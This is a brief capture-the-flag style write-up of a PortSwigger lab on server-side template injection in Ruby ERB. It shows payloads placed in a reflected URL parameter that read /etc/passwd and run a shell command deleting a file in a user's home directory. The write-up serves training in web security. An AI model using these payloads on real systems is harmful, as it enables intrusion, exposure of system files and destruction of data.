# URL
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
# Concept
* basic SSTi attack
# Method of solve
* in the web app, if a product is out of stock, the error message appears in the URL parameter of the webpage, e.g.,
```
https://0a980050031be0a284b392a200c2005c.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```
* this means we could put whatever we want into the `message` URL parameter and it will be reflect on the subsequent webpage
* we have been told that the app is using the Ruby ERB templating engine, so we can test if we can read abitrary files with this payload in the `message` URL parameter:
```
<%= File.open('/etc/passwd').read %>
```
* this works, so we can proceed with deleting the target file for the lab's goal, the `morale.txt` file in the `carlos` user's home directory:
```
<%= `rm /home/carlos/morale.txt` %>
```
* Finis
